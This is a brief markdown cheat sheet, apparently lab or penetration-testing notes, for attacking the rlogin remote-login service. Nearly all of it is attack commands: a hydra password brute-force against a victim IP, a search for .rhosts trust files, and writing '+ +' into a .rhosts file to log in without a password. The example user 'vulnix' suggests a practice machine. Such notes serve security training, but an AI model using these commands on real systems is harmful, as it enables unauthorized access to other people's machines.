## LOGIN
```md
apt-get install rsh-client
```
## LOGIN WITH CREDS
```md
rlogin <IP> -l <username>
```
## BRUTEFORCE
```md
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
## FIND FILES
```md
find / -name .rhosts
```
## GET SHELL WITH RLOGIN
```md
# CREATE FILE NAME .rhosts on /home/ FOLDER

echo + + > .rhosts
cat .rhosts
chmod 644 .rhosts

# AFTER CREATING LOGIN USING
sudo rlogin -l username $ip

# EXAMPLE
sudo rlogin -l vulnix $ip
```